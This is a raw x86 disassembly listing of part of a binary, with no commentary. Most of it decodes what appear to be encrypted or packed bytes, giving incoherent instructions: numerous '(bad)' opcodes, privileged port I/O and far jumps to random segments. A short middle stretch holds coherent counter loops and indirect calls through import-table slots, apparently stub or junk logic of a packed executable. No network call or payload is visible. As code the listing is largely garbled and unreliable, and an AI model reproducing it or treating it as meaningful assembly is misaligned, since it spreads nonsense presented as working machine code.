  41c197:	jb     0x41c137
  41c199:	push   ecx
  41c19a:	xchg   edi,eax
  41c19b:	in     eax,0xc1
  41c19d:	repnz mov ds:0x22cdca42,al
  41c1a3:	dec    esp
  41c1a4:	retf   0x6273
  41c1a7:	fstp   DWORD PTR [esp+eax*2+0x70b729a9]
  41c1ae:	mov    bh,bh
  41c1b0:	rcr    DWORD PTR [ebp-0x4081798e],0x80
  41c1b7:	adc    bh,0xb1
  41c1ba:	inc    ebp
  41c1bb:	mov    al,0x27
  41c1bd:	das    
  41c1be:	shr    DWORD PTR [ebp-0x78],0xac
  41c1c2:	mov    cl,0x1
  41c1c4:	sub    BYTE PTR [esi+0x12dcccc1],0xce
  41c1cb:	and    esi,ebp
  41c1cd:	sbb    bh,BYTE PTR [eax+0x3b5df39]
  41c1d3:	sahf   
  41c1d4:	xchg   BYTE PTR [edi-0x465d0777],dh
  41c1da:	sub    eax,0xa187723b
  41c1df:	test   al,0xee
  41c1e1:	retf   
  41c1e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1e3:	loope  0x41c1e2
  41c1e5:	mov    esp,DWORD PTR [ebx]
  41c1e7:	adc    bl,BYTE PTR [edx-0x4124d26f]
  41c1ed:	xor    eax,DWORD PTR [ebx+0x71]
  41c1f0:	retf   0x2cd3
  41c1f3:	in     al,dx
  41c1f4:	lds    edx,FWORD PTR [esi]
  41c1f6:	or     BYTE PTR [edi],cl
  41c1f8:	pop    ebp
  41c1f9:	lods   al,BYTE PTR ds:[esi]
  41c1fa:	xor    al,0x3
  41c1fc:	and    eax,0x6cc5d9b3
  41c201:	loope  0x41c1f9
  41c203:	xor    ch,0x42
  41c206:	dec    esp
  41c207:	mov    bh,0x85
  41c209:	push   ss
  41c20a:	fadd   DWORD PTR [ebx]
  41c20c:	cmp    eax,0xe0c9636e
  41c211:	add    eax,0xf68ac884
  41c216:	nop
  41c217:	or     DWORD PTR [ebx],esp
  41c219:	shr    edi,0x92
  41c21c:	aaa    
  41c21d:	xchg   ecx,eax
  41c21e:	and    DWORD PTR [esi+0x239fd661],esp
  41c224:	push   edi
  41c225:	mov    al,ds:0x4486c9d5
  41c22a:	cmp    BYTE PTR [eax+0x3c805324],bl
  41c230:	into   
  41c231:	outs   dx,DWORD PTR ds:[esi]
  41c232:	xor    edi,DWORD PTR cs:[eiz*1+0x70fdaed5]
  41c23a:	scas   al,BYTE PTR es:[edi]
  41c23b:	in     al,dx
  41c23c:	adc    esp,esp
  41c23e:	shl    esp,cl
  41c240:	out    dx,eax
  41c241:	mov    DWORD PTR [ebx-0x6a],edi
  41c244:	push   cs
  41c245:	jo     0x41c213
  41c247:	mov    edi,0xdf689a13
  41c24c:	pushf  
  41c24d:	in     eax,dx
  41c24e:	in     eax,0x34
  41c250:	aas    
  41c251:	cmp    al,0x30
  41c253:	fs ds cmc 
  41c256:	sub    dl,BYTE PTR [eax]
  41c258:	and    esi,edx
  41c25a:	inc    ecx
  41c25b:	inc    edi
  41c25c:	xsha1  (bad)
  41c25d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c25e:	dec    esi
  41c25f:	mov    edi,0x6895d5e4
  41c264:	sbb    eax,0xef8f66a0
  41c269:	inc    esi
  41c26a:	in     al,0x3b
  41c26c:	cmp    ah,BYTE PTR [eax]
  41c26e:	add    al,0x3b
  41c270:	mov    cl,0x54
  41c272:	and    BYTE PTR [ebx],dl
  41c274:	or     DWORD PTR [edi+0x2c],edi
  41c277:	push   edi
  41c278:	fmul   QWORD PTR [edx+0x7f]
  41c27b:	(bad)  
  41c27c:	jmp    0x18ff35d8
  41c281:	mov    ds:0x6cac4f0f,eax
  41c286:	clc    
  41c287:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c288:	mov    eax,ds:0xbd8823ad
  41c28d:	shl    BYTE PTR [ecx],cl
  41c28f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c290:	sub    DWORD PTR [edi+0x7c],ebp
  41c293:	mov    edx,0xbc7e792
  41c298:	shl    esp,cl
  41c29a:	inc    edx
  41c29b:	fcomp  DWORD PTR [eax-0x7d]
  41c29e:	push   edx
  41c29f:	jno    0x41c298
  41c2a1:	inc    DWORD PTR [ebp-0x59]
  41c2a4:	dec    ebx
  41c2a5:	out    dx,eax
  41c2a6:	push   esp
  41c2a7:	mov    DWORD PTR [edi],esp
  41c2a9:	mov    esp,ecx
  41c2ab:	sub    DWORD PTR [ecx],0x1
  41c2ae:	push   ebp
  41c2af:	das    
  41c2b0:	das    
  41c2b1:	ret    
  41c2b2:	(bad)  
  41c2b4:	xchg   edx,eax
  41c2b5:	add    DWORD PTR [ecx+ebx*2],ebx
  41c2b8:	pop    eax
  41c2b9:	(bad)  
  41c2ba:	adc    al,BYTE PTR [ebx-0x5f9c8b75]
  41c2c0:	scas   eax,DWORD PTR es:[edi]
  41c2c1:	inc    ecx
  41c2c2:	inc    ebp
  41c2c3:	ficom  WORD PTR [edx]
  41c2c5:	(bad)  
  41c2c6:	and    al,0x20
  41c2c8:	out    0xd2,al
  41c2ca:	or     eax,0x1477f897
  41c2cf:	mov    edx,0x9064c98
  41c2d4:	(bad)  
  41c2d5:	(bad)  
  41c2d6:	in     eax,dx
  41c2d7:	jp     0x41c2ac
  41c2d9:	shl    DWORD PTR [eax+0x3a],cl
  41c2dc:	or     BYTE PTR [ecx],0x9d
  41c2df:	add    ch,BYTE PTR [ebx-0x26b4f353]
  41c2e5:	outs   dx,DWORD PTR ds:[esi]
  41c2e6:	push   cs
  41c2e7:	das    
  41c2e8:	bound  ebp,QWORD PTR gs:[ebx-0x688fca8]
  41c2ef:	jle    0x41c319
  41c2f1:	sti    
  41c2f2:	mov    cl,BYTE PTR [ebx]
  41c2f4:	addr16 push ebp
  41c2f6:	fiadd  WORD PTR [ecx]
  41c2f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2f9:	aad    0xed
  41c2fb:	mov    eax,DWORD PTR [eax-0x38]
  41c2fe:	mov    esp,0x32c8a274
  41c303:	mov    esp,0xf123f24f
  41c308:	or     al,0x1a
  41c30a:	lahf   
  41c30b:	mov    ebx,0xfedb5734
  41c310:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c311:	mov    cl,0x41
  41c313:	xchg   ecx,edx
  41c315:	mov    ah,0x48
  41c317:	dec    edx
  41c318:	repz fsubr DWORD PTR [ecx+edx*2]
  41c31c:	pusha  
  41c31d:	(bad)  
  41c31e:	sub    eax,0x545e27bd
  41c323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c324:	aas    
  41c325:	sub    BYTE PTR [ecx],dl
  41c327:	sub    al,0x96
  41c329:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c32a:	jmp    0x864b:0xd443be52
  41c331:	int    0x3b
  41c333:	ja     0x41c390
  41c335:	and    DWORD PTR [edx+0x24],esp
  41c338:	cdq    
  41c339:	aas    
  41c33a:	push   edx
  41c33b:	xlat   BYTE PTR ds:[ebx]
  41c33c:	sahf   
  41c33d:	fcmovnbe st,st(5)
  41c33f:	and    al,0xce
  41c341:	cmp    ecx,DWORD PTR [ebx+0x6d]
  41c344:	test   bh,al
  41c346:	out    dx,al
  41c347:	cmp    BYTE PTR [ecx],0x2c
  41c34a:	(bad)  
  41c34b:	call   FWORD PTR [eax-0xe]
  41c34e:	push   ss
  41c34f:	rol    DWORD PTR [ebx+0x79],cl
  41c352:	aaa    
  41c353:	cmp    bh,BYTE PTR [edx]
  41c355:	outs   dx,DWORD PTR ds:[esi]
  41c356:	test   al,0xa9
  41c358:	nop
  41c359:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c35a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c35b:	cmp    eax,0x8b4188a3
  41c360:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c361:	xchg   ecx,eax
  41c362:	or     BYTE PTR [edx+0x1154c5f8],cl
  41c368:	jnp    0x41c3dd
  41c36a:	test   al,0xdf
  41c36c:	bound  eax,QWORD PTR [ebx+0x31]
  41c36f:	test   edi,edx
  41c371:	push   eax
  41c372:	js     0x41c2fd
  41c374:	jecxz  0x41c37f
  41c376:	mov    cl,al
  41c378:	fld    QWORD PTR [ecx]
  41c37a:	sar    DWORD PTR [eax+0x5b],cl
  41c37d:	call   0x7de9feb3
  41c382:	inc    eax
  41c383:	std    
  41c384:	jbe    0x41c3d6
  41c386:	xchg   edx,eax
  41c387:	jbe    0x41c39d
  41c389:	lea    ebx,[eax-0xe]
  41c38c:	push   esp
  41c38d:	mov    cl,0x63
  41c38f:	mov    esp,0xc8cc01ce
  41c394:	push   ecx
  41c395:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c396:	sbb    DWORD PTR [edi-0x4],0xe3be4dd4
  41c39d:	stc    
  41c39e:	outs   dx,BYTE PTR ds:[esi]
  41c39f:	sub    BYTE PTR [ebp+0x54],bl
  41c3a2:	sbb    ebx,DWORD PTR [edi]
  41c3a4:	mov    eax,ds:0x13a11d87
  41c3a9:	cs loopne 0x41c34a
  41c3ac:	aaa    
  41c3ad:	mov    eax,ds:0x8d498c76
  41c3b2:	lods   al,BYTE PTR ds:[esi]
  41c3b3:	push   eax
  41c3b4:	push   ebp
  41c3b5:	and    dh,BYTE PTR [edi-0x3c]
  41c3b8:	dec    edi
  41c3b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3ba:	jecxz  0x41c33e
  41c3bc:	mov    edi,0x45f9e8b9
  41c3c1:	fdiv   DWORD PTR [esi+ebx*4-0x6f1f10b6]
  41c3c8:	ins    BYTE PTR es:[edi],dx
  41c3c9:	clc    
  41c3ca:	hlt    
  41c3cb:	jg     0x41c3a9
  41c3cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3ce:	outs   dx,DWORD PTR ds:[esi]
  41c3cf:	mov    cl,0xcd
  41c3d1:	jmp    0x5a56:0x6968fece
  41c3d8:	push   esi
  41c3d9:	(bad)  [ebx-0x17]
  41c3dc:	push   eax
  41c3dd:	and    DWORD PTR ds:0xcf2e9407,edx
  41c3e3:	mov    eax,0x4741dfea
  41c3e8:	cwde   
  41c3e9:	test   DWORD PTR [esp+ecx*8-0x2e795d31],ebx
  41c3f0:	mov    edx,0x158a764b
  41c3f5:	add    edi,DWORD PTR ds:0x243765ac
  41c3fb:	enter  0xc409,0x4e
  41c3ff:	mov    dh,0x81
  41c401:	in     eax,dx
  41c402:	arpl   ax,ax
  41c404:	add    edi,0x11
  41c407:	pop    ebp
  41c408:	jge    0x41c3c3
  41c40a:	out    0x7b,eax
  41c40c:	sahf   
  41c40d:	pop    ecx
  41c40e:	pushf  
  41c40f:	sbb    ch,al
  41c411:	cmp    DWORD PTR [esi+0x35c0ac08],eax
  41c417:	jge    0x41c3a8
  41c419:	int3   
  41c41a:	rcr    BYTE PTR [edi],cl
  41c41c:	pushf  
  41c41d:	mov    ds:0xefc9ebd7,al
  41c422:	mov    eax,DWORD PTR [ebx+0x6d]
  41c425:	adc    ebx,DWORD PTR [ebp-0x1dc352ce]
  41c42b:	add    BYTE PTR [esi],ch
  41c42d:	mov    al,ds:0x5e26e970
  41c432:	fwait
  41c433:	xor    al,0x6d
  41c435:	mov    ebx,0xfce5a94c
  41c43a:	mov    ch,0xfd
  41c43c:	pop    edx
  41c43d:	mov    esi,0x6b2e37a8
  41c442:	(bad)  
  41c443:	push   edx
  41c444:	mov    bl,0x3e
  41c446:	mov    dl,0xb6
  41c448:	mov    cl,0xc9
  41c44a:	jecxz  0x41c4ad
  41c44c:	push   ecx
  41c44d:	test   eax,0x511ca675
  41c452:	ror    DWORD PTR [ebx-0x22],0xb1
  41c456:	lds    ebp,FWORD PTR [edx+0x5cdc2ab8]
  41c45c:	or     ecx,DWORD PTR [ebp+0x8f3a5f8]
  41c462:	mov    al,ds:0x3b9e8da3
  41c467:	xor    DWORD PTR ds:0x18f66ce1,0xffffffa3
  41c46e:	mov    edi,0xccaa217e
  41c473:	pop    esp
  41c474:	jnp    0x41c4ad
  41c476:	icebp  
  41c477:	imul   ecx,esp,0x6db7e185
  41c47d:	arpl   WORD PTR [ebx],cx
  41c47f:	iret   
  41c480:	mov    cs,WORD PTR [eax]
  41c482:	ret    0xb278
  41c485:	jns    0x41c480
  41c487:	jecxz  0x41c497
  41c489:	push   ss
  41c48a:	imul   eax,DWORD PTR [esp+eiz*8-0x67],0xa802e7bb
  41c492:	add    bl,ch
  41c494:	cmp    ch,dl
  41c496:	mov    eax,ds:0x6d0d0209
  41c49b:	or     esi,DWORD PTR [esi+ebp*8-0x4a59873f]
  41c4a2:	dec    ebx
  41c4a3:	xlat   BYTE PTR ds:[ebx]
  41c4a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4a5:	inc    edi
  41c4a6:	mov    edx,0xaab5fa27
  41c4ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4ac:	xor    DWORD PTR [edx-0x42],edi
  41c4af:	(bad)  
  41c4b0:	adc    ch,BYTE PTR [edi+0x4]
  41c4b3:	mov    edx,esp
  41c4b5:	sbb    BYTE PTR [esi-0x5529013f],dl
  41c4bb:	push   ds
  41c4bc:	mov    dl,BYTE PTR [ecx-0x3b]
  41c4bf:	jp     0x41c45b
  41c4c1:	pop    ebp
  41c4c2:	xchg   esp,eax
  41c4c3:	jmp    0x41c44e
  41c4c5:	pushf  
  41c4c6:	icebp  
  41c4c7:	mov    bl,0x76
  41c4c9:	and    al,0x8
  41c4cb:	(bad)  
  41c4cc:	ja     0x41c4b4
  41c4ce:	mov    cl,0xec
  41c4d0:	mov    edx,0x1b8ad180
  41c4d5:	fild   QWORD PTR [esi]
  41c4d7:	jae    0x41c4ea
  41c4d9:	dec    esp
  41c4da:	adc    DWORD PTR [edi+0x2a],ebx
  41c4dd:	mov    fs,WORD PTR [ebp+0x7ab481a1]
  41c4e3:	mov    al,ds:0x5a9f3b6c
  41c4e8:	push   es
  41c4e9:	addr16 retf 0x4236
  41c4ed:	adc    BYTE PTR ds:0x954fb061,bh
  41c4f3:	push   eax
  41c4f4:	and    ebx,DWORD PTR [esi+ecx*1+0x1c4fc0f4]
  41c4fb:	jns    0x41c4ad
  41c4fd:	mov    al,ds:0xe983070f
  41c502:	pop    ds
  41c503:	cld    
  41c504:	xor    esi,edi
  41c506:	imul   ecx,DWORD PTR [edi+0x42],0xed0b5311
  41c50d:	sub    ecx,0xffffffa1
  41c510:	adc    BYTE PTR [ecx],dh
  41c512:	mov    al,0x4a
  41c514:	pusha  
  41c515:	pop    ebp
  41c516:	bound  eax,QWORD PTR [esi]
  41c518:	pop    eax
  41c519:	adc    al,0x89
  41c51b:	jae    0x41c560
  41c51d:	(bad)  
  41c51e:	adc    ebx,ebp
  41c520:	sahf   
  41c521:	mov    cl,dl
  41c523:	ror    DWORD PTR [ebx],0x85
  41c526:	dec    ebp
  41c527:	sub    DWORD PTR [ebp-0x34],ebx
  41c52a:	xchg   edi,eax
  41c52b:	xchg   ebx,eax
  41c52c:	mov    eax,ds:0x8bb9b3ff
  41c531:	dec    ecx
  41c532:	lods   al,BYTE PTR ds:[esi]
  41c533:	adc    eax,0x235dfb36
  41c538:	loop   0x41c4da
  41c53a:	fs cmp al,0x4c
  41c53d:	inc    ebx
  41c53e:	xchg   edi,eax
  41c53f:	mov    bh,0x33
  41c541:	stc    
  41c542:	sbb    al,0x44
  41c544:	nop
  41c545:	add    eax,0x657efa31
  41c54a:	aas    
  41c54b:	adc    eax,0xb87767aa
  41c550:	mov    al,ds:0xaa498ed9
  41c555:	mov    es,eax
  41c557:	add    eax,0xb201605a
  41c55c:	popa   
  41c55d:	or     BYTE PTR [edi*1+0x48b142c2],0xfa
  41c565:	aas    
  41c566:	cmp    edx,edi
  41c568:	sar    bh,0x56
  41c56b:	mov    ch,0xd0
  41c56d:	je     0x41c5d1
  41c56f:	jge    0x41c50c
  41c571:	sbb    al,bh
  41c573:	repz push ebx
  41c576:	xor    eax,DWORD PTR [edx]
  41c578:	pop    edx
  41c579:	inc    ebx
  41c57a:	cmp    al,0x13
  41c57c:	sbb    eax,0x2494a509
  41c581:	loopne 0x41c5cf
  41c583:	or     al,0x7c
  41c585:	jb     0x41c5ed
  41c587:	jae    0x41c54f
  41c589:	mov    ecx,0xf0665ceb
  41c58e:	inc    ebp
  41c58f:	out    dx,eax
  41c590:	cmp    edi,ebp
  41c592:	daa    
  41c593:	pop    es
  41c594:	jl     0x41c5ac
  41c596:	(bad)  
  41c597:	ins    BYTE PTR es:[edi],dx
  41c598:	cmp    eax,DWORD PTR [edx]
  41c59a:	xchg   ebx,eax
  41c59b:	ins    BYTE PTR es:[edi],dx
  41c59c:	sub    edx,DWORD PTR [edx-0x7]
  41c59f:	inc    esp
  41c5a0:	xor    ebx,DWORD PTR [edx+ecx*4]
  41c5a3:	ds dec edi
  41c5a5:	pop    ss
  41c5a6:	push   esp
  41c5a7:	sar    BYTE PTR [esi],0x49
  41c5aa:	and    ah,BYTE PTR [ecx+0x50]
  41c5ad:	mov    al,ds:0xa7d8775a
  41c5b2:	scas   eax,DWORD PTR es:[edi]
  41c5b3:	adc    al,0xa6
  41c5b5:	cmp    bh,BYTE PTR [ebx]
  41c5b7:	clc    
  41c5b8:	int    0x20
  41c5ba:	sub    BYTE PTR [ebp+0x1325e7e9],cl
  41c5c0:	mov    ebp,0x80b39f23
  41c5c5:	scas   eax,DWORD PTR es:[edi]
  41c5c6:	jnp    0x41c5c4
  41c5c8:	sbb    eax,0x4a75644b
  41c5cd:	iret   
  41c5ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5cf:	pop    eax
  41c5d0:	(bad)
  41c5d4:	adc    edx,0xc579292e
  41c5da:	push   ecx
  41c5db:	push   eax
  41c5dc:	and    edx,DWORD PTR [ebp-0x7193d31a]
  41c5e2:	mov    edi,0xb5e3f21a
  41c5e7:	cmp    DWORD PTR [esi+0x63123d1d],ebp
  41c5ed:	mov    al,0x28
  41c5ef:	or     al,0x58
  41c5f1:	icebp  
  41c5f2:	jno    0x41c62b
  41c5f4:	adc    dh,BYTE PTR [eax]
  41c5f6:	mov    esi,ecx
  41c5f8:	cld    
  41c5f9:	fwait
  41c5fa:	add    edi,ecx
  41c5fc:	and    DWORD PTR ds:0x42a325,0x0
  41c606:	jmp    0x41c618
  41c60b:	mov    ebx,DWORD PTR ds:0x42a325
  41c611:	inc    ebx
  41c612:	mov    DWORD PTR ds:0x42a325,ebx
  41c618:	cmp    DWORD PTR ds:0x42a325,0x10
  41c61f:	jae    0x41cbd2
  41c625:	cmp    DWORD PTR ds:0x42a325,0xa
  41c62c:	jne    0x41c63b
  41c632:	push   DWORD PTR [ebp-0x28]
  41c635:	call   DWORD PTR ds:0x425000
  41c63b:	cmp    DWORD PTR ds:0x42a325,0x9
  41c642:	jne    0x41c655
  41c648:	mov    ebx,DWORD PTR ds:0x42a325
  41c64e:	inc    ebx
  41c64f:	mov    DWORD PTR ds:0x42a325,ebx
  41c655:	jmp    0x41c60b
  41c65a:	mov    DWORD PTR ds:0x42a355,0x18
  41c664:	cmp    DWORD PTR ds:0x42a355,0x0
  41c66b:	je     0x41cbd2
  41c671:	cmp    DWORD PTR ds:0x42a355,0x5
  41c678:	jne    0x41c68c
  41c67e:	push   0x6522
  41c683:	push   DWORD PTR [ebp-0xc]
  41c686:	call   DWORD PTR ds:0x425004
  41c68c:	cmp    DWORD PTR ds:0x42a355,0x6
  41c693:	jne    0x41c6a8
  41c699:	xor    ebx,ebx
  41c69b:	xor    ebx,DWORD PTR ds:0x42a355
  41c6a1:	dec    ebx
  41c6a2:	mov    DWORD PTR ds:0x42a355,ebx
  41c6a8:	mov    ebx,DWORD PTR ds:0x42a355
  41c6ae:	dec    ebx
  41c6af:	mov    DWORD PTR ds:0x42a355,ebx
  41c6b5:	jmp    0x41c664
  41c6ba:	or     DWORD PTR ds:0x42a365,edi
  41c6c0:	jmp    0x41cbd2
  41c6c5:	cmp    eax,0xc9cfc5c2
  41c6ca:	fcmovnbe st,st(5)
  41c6cc:	rol    BYTE PTR [esp+ebp*4+0x201c6db4],cl
  41c6d3:	cmp    DWORD PTR [edx-0x5f],esi
  41c6d6:	popf   
  41c6d7:	jg     0x41c751
  41c6d9:	jae    0x41c757
  41c6db:	js     0x41c755
  41c6dd:	dec    esp
  41c6de:	mov    ebx,0xa2c7a593
  41c6e3:	ror    ebp,1
  41c6e5:	jae    0x41c714
  41c6e7:	sub    ebp,DWORD PTR [edi]
  41c6e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6ea:	cs and al,0xad
  41c6ed:	shl    BYTE PTR [esp+eax*8],0x8d
  41c6f1:	in     al,dx
  41c6f2:	lea    esi,[eax-0x3d]
  41c6f5:	and    DWORD PTR [esi],esi
  41c6f7:	pop    edx
  41c6f8:	mov    bl,0x97
  41c6fa:	sbb    ecx,ecx
  41c6fc:	mov    ds:0x3df7bb9c,al
  41c701:	jmp    0xe6d1:0xcb170337
  41c708:	jl     0x41c6cb
  41c70a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c70b:	les    edi,FWORD PTR [ebx]
  41c70d:	cmp    bh,bl
  41c70f:	dec    esi
  41c710:	stos   BYTE PTR es:[edi],al
  41c711:	cmp    eax,0x96f7b9f5
  41c716:	jg     0x41c69c
  41c718:	ss retf 
  41c71a:	daa    
  41c71b:	lods   al,BYTE PTR ds:[esi]
  41c71c:	add    DWORD PTR [ecx-0xbb595e7],edi
  41c722:	pop    edx
  41c723:	loopne 0x41c6f7
  41c725:	pop    ebp
  41c726:	sub    DWORD PTR [ebx-0x7],0x1907b05
  41c72d:	cs jecxz 0x41c6b1
  41c730:	xchg   ebp,eax
  41c731:	ins    DWORD PTR es:[edi],dx
  41c732:	int3   
  41c733:	aaa    
  41c734:	or     ah,BYTE PTR [ebp-0x28]
  41c737:	cld    
  41c738:	jecxz  0x41c713
  41c73a:	mov    ch,0x27
  41c73c:	inc    ecx
  41c73d:	fsub   QWORD PTR [edi+0xa763bc2]
  41c743:	pushf  
  41c744:	imul   ecx,DWORD PTR [esi-0x7c],0x6dc5c556
  41c74b:	xchg   edi,eax
  41c74c:	enter  0x4771,0xed
  41c750:	sub    cl,cl
  41c752:	int    0x35
  41c754:	es jle 0x41c72f
  41c757:	test   DWORD PTR [ebp-0x1eb04ea0],edx
  41c75d:	lods   eax,DWORD PTR ds:[esi]
  41c75e:	nop
  41c75f:	mov    DWORD PTR [ecx-0x50],0xcddfaed5
  41c766:	xlat   BYTE PTR ds:[ebx]
  41c767:	adc    eax,0x9c62ecb7
  41c76c:	push   edi
  41c76d:	and    esp,ebp
  41c76f:	dec    esp
  41c770:	sbb    BYTE PTR [edx-0x18],dh
  41c773:	lahf   
  41c774:	adc    bl,BYTE PTR [edx]
  41c776:	ins    DWORD PTR es:[edi],dx
  41c777:	test   al,0xf
  41c779:	loopne 0x41c749
  41c77b:	jecxz  0x41c719
  41c77d:	sahf   
  41c77e:	mov    ss:0x1e7d734f,eax
  41c784:	jne    0x41c744
  41c786:	and    bh,ch
  41c788:	stc    
  41c789:	mov    bh,0xdd
  41c78b:	pop    esi
  41c78c:	jo     0x41c7bc
  41c78e:	pop    es
  41c78f:	nop
  41c790:	imul   edx,DWORD PTR [ebp+0x7f],0xffffffcf
  41c794:	int    0xfc
  41c796:	scas   eax,DWORD PTR es:[edi]
  41c797:	enter  0x4284,0x4d
  41c79b:	fcomp  st(2)
  41c79d:	xchg   edx,eax
  41c79e:	adc    cl,BYTE PTR [ecx+0x115ad970]
  41c7a4:	fistp  DWORD PTR [esp+eax*1]
  41c7a7:	adc    cl,BYTE PTR [ebx+ebx*1]
  41c7aa:	stos   DWORD PTR es:[edi],eax
  41c7ab:	pop    ebx
  41c7ac:	pop    edx
  41c7ad:	jg     0x41c79c
  41c7af:	jl     0x41c79c
  41c7b1:	sub    ebp,DWORD PTR [ebx+0x18]
  41c7b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7b5:	fld    TBYTE PTR [eax+0xcb6f44a]
  41c7bb:	cmc    
  41c7bc:	loope  0x41c814
  41c7be:	mov    ebx,0x628961f3
  41c7c3:	inc    esi
  41c7c4:	(bad)  
  41c7c5:	jg     0x41c749
  41c7c7:	and    eax,0x274a1b19
  41c7cc:	cld    
  41c7cd:	mov    ch,0xa9
  41c7cf:	jne    0x41c814
  41c7d1:	adc    esp,DWORD PTR [edx-0x6e]
  41c7d4:	mov    DWORD PTR [ebp+0x29],ebp
  41c7d7:	pusha  
  41c7d8:	adc    BYTE PTR [ecx],cl
  41c7da:	xchg   ecx,eax
  41c7db:	mov    eax,DWORD PTR [ebp-0x40fc00e4]
  41c7e1:	or     DWORD PTR [ecx-0x57d19261],ecx
  41c7e7:	push   es
  41c7e8:	jns    0x41c84a
  41c7ea:	in     eax,0x3b
  41c7ec:	ret    
  41c7ed:	cld    
  41c7ee:	mov    ebx,0x6b09346c
  41c7f3:	mov    eax,ds:0x4227bb71
  41c7f8:	minps  xmm3,xmm2
  41c7fb:	mov    dl,0x66
  41c7fd:	xchg   edx,eax
  41c7fe:	xchg   edx,eax
  41c7ff:	sub    al,0x25
  41c801:	xor    ch,BYTE PTR [edi+0x19cecf66]
  41c807:	rcl    edx,0xa6
  41c80a:	aas    
  41c80b:	and    BYTE PTR [ebx-0xd],cl
  41c80e:	fwait
  41c80f:	std    
  41c810:	xchg   ebp,eax
  41c811:	and    BYTE PTR ds:0xad1c6a88,ah
  41c817:	aam    0x67
  41c819:	loopne 0x41c884
  41c81b:	mov    edx,0x2efd2df9
  41c820:	sub    bl,cl
  41c822:	data16 adc al,bh
  41c825:	test   bh,0x17
  41c828:	mov    esi,0x5391a0ee
  41c82d:	dec    edx
  41c82e:	add    eax,0x9e1d633e
  41c833:	pop    esp
  41c834:	scas   al,BYTE PTR es:[edi]
  41c835:	pop    esp
  41c836:	les    edx,FWORD PTR [ebx+0x203cb13d]
  41c83c:	jno    0x41c8a8
  41c83e:	idiv   BYTE PTR [edi]
  41c840:	cwde   
  41c841:	xor    dh,BYTE PTR [esi-0x4bbc3da4]
  41c847:	ss pop ebx
  41c849:	(bad)  
  41c84a:	dec    edi
  41c84b:	push   es
  41c84c:	jg     0x41c8b6
  41c84e:	fcomp  DWORD PTR [ebp-0x7bf7befe]
  41c854:	jmp    0xe7aa4116
  41c859:	inc    eax
  41c85a:	dec    ebp
  41c85b:	rol    DWORD PTR [ecx-0x34eee474],cl
  41c861:	sbb    ecx,DWORD PTR [ebp-0x5bb333c7]
  41c867:	dec    ecx
  41c868:	lods   eax,DWORD PTR ds:[esi]
  41c869:	jg     0x41c823
  41c86b:	test   eax,0x7deb000a
  41c870:	xchg   edi,eax
  41c871:	adc    eax,0xaa397a0d
  41c876:	mov    ch,0x10
  41c878:	sub    al,0x92
  41c87a:	add    BYTE PTR [edx+0x73],al
  41c87d:	xchg   esp,eax
  41c87e:	js     0x41c844
  41c880:	jmp    0x41c824
  41c882:	lock outs dx,DWORD PTR ds:[esi]
  41c884:	mov    eax,0xf6489c5a
  41c889:	enter  0x9779,0xdb
  41c88d:	out    0x9c,eax
  41c88f:	dec    esi
  41c890:	lods   eax,DWORD PTR ds:[esi]
  41c891:	pop    esp
  41c892:	push   es
  41c893:	inc    esi
  41c894:	mov    dl,0x3
  41c896:	cmp    esp,DWORD PTR [ecx-0x3c425459]
  41c89c:	mov    edx,0x7fdab62b
  41c8a1:	jmp    0x2449205c
  41c8a6:	out    0x91,eax
  41c8a8:	add    eax,0x4e6293df
  41c8ad:	popf   
  41c8ae:	aad    0xcb
  41c8b0:	fld    DWORD PTR [edi-0xe]
  41c8b3:	push   ds
  41c8b4:	cmp    edi,DWORD PTR [ecx]
  41c8b6:	mov    ds:0x52500322,al
  41c8bb:	ds mov ecx,0xcf06b08a
  41c8c1:	or     BYTE PTR [esi],ah
  41c8c3:	lods   al,BYTE PTR ds:[esi]
  41c8c4:	or     BYTE PTR [edx+0x1f],dl
  41c8c7:	and    ebp,DWORD PTR [ebp+0x5]
  41c8ca:	and    eax,0xda446047
  41c8cf:	inc    esp
  41c8d0:	mov    esi,0x1a990848
  41c8d5:	mov    ds:0xda6eec03,al
  41c8da:	scas   eax,DWORD PTR es:[edi]
  41c8db:	mov    eax,ds:0x2ccdfbe4
  41c8e0:	xor    BYTE PTR [eax],0x8c
  41c8e3:	push   ecx
  41c8e4:	clc    
  41c8e5:	mov    ch,0xdb
  41c8e7:	lea    ebx,ds:0xeb119e39
  41c8ed:	push   ss
  41c8ee:	fnstsw WORD PTR ds:0x7b0726db
  41c8f4:	fbld   TBYTE PTR [esi+ebx*2]
  41c8f7:	or     edi,ebx
  41c8f9:	mov    DWORD PTR ds:0xfa630196,ebx
  41c8ff:	add    ecx,DWORD PTR [edx+eax*2+0x2632fa74]
  41c906:	clc    
  41c907:	add    esp,ebp
  41c909:	(bad)  
  41c90a:	fstp   QWORD PTR [ebx-0x2cd23c99]
  41c910:	mov    DWORD PTR [edx],eax
  41c912:	add    ah,0xcb
  41c915:	lahf   
  41c916:	imul   BYTE PTR [ebx+0x5cb5e090]
  41c91c:	xlat   BYTE PTR ss:[ebx]
  41c91e:	mov    cs,ebp
  41c920:	stos   DWORD PTR es:[edi],eax
  41c921:	add    eax,0xf61242fa
  41c926:	lea    ecx,[eax-0xe]
  41c929:	sub    DWORD PTR [edx],edi
  41c92b:	int3   
  41c92c:	int3   
  41c92d:	xor    eax,0x726fed4d
  41c932:	js     0x41c97e
  41c934:	out    dx,al
